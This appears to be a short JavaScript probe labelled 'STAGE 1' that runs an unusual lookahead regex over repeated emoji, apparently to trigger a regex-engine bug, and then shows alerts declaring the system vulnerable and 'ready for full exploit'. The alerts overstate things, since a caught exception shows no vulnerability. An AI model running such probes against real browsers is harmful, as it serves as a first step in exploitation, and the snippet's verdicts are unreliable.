// STAGE 1
try {
    let emoji = String.fromCodePoint(128512);
    let str = emoji.repeat(11);
    
    // 
    str.replace(/(?!(?=^a|()+()+x)(abc))/gmu, '|');
    
    // 
    alert("SYSTEM VULNERABLE - Ready for full exploit");
    
} catch (e) {
    alert("CRASH CONFIRMED - System is vulnerable!");
}